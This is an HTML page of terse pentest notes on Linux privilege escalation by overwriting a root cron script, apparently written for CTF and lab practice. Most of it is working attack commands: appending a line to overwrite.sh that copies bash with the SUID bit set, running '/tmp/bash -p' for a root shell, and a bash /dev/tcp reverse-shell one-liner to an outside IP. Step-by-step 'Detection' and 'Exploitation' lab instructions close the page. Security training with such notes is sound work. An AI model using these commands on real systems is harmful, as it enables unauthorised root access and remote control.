<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Cron File Overwrites</title>
</head><body>Escalation via Cron overwrites<br/>
<br/>
<b>cat /etc/crontab</b><br/>
<br/>
you can find file locations with <br/>
<br/>
<b>locate &lt;file name&gt;</b><br/>
<br/>
<br/>
We are looking for jobs with read/write access<br/>
<br/>
<br/>
<img height="43" src="image.png" width="750"/><br/>
<br/>
<br/>
We see above. Read and write... but no execute... that is fine as the file executes with root permission as a cron job.<br/>
<br/>
<br/>
From here, you can overwrite that file. <br/>
<br/>
Reverse shell<br/>
local priv esc<br/>
etc<br/>
<br/>
standard payload<br/>
<br/>
<b>echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt;&gt; /usr/local/bin/overwrite.sh<br/>
<br/>
</b><b>echo 'cp /bin/bash /tmp/bash2; chmod +s /tmp/bash2' &gt; </b>/var/www/html/tmp/clean.sh<br/>
<br/>
bash -i &gt;&amp; /dev/tcp/10.4.8.170/7331 0&gt;&amp;1<br/>
<br/>
cat outt eh file, make sure the command was appended<br/>
<br/>
ls- la<br/>
<br/>
check for update<br/>
<br/>
run with<br/>
<br/>
<b>/tmp/bash -p</b><br/>
<br/>
<br/>
<br/>
*** This is the most common seen in CTFs and the wild<br/>
<br/>
<br/>
<br/>
<br/>
Detection<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type: cat /etc/crontab<br/>
2. From the output, notice the script “overwrite.sh”<br/>
3. In command prompt type: ls -l /usr/local/bin/overwrite.sh<br/>
4. From the output, notice the file permissions.<br/>
<br/>
Exploitation<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type:<br/>
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt;&gt; /usr/local/bin/overwrite.sh<br/>
2. Wait 1 minute for the Bash script to execute.<br/>
3. In command prompt type: /tmp/bash -p<br/>
4. In command prompt type: id</body></html>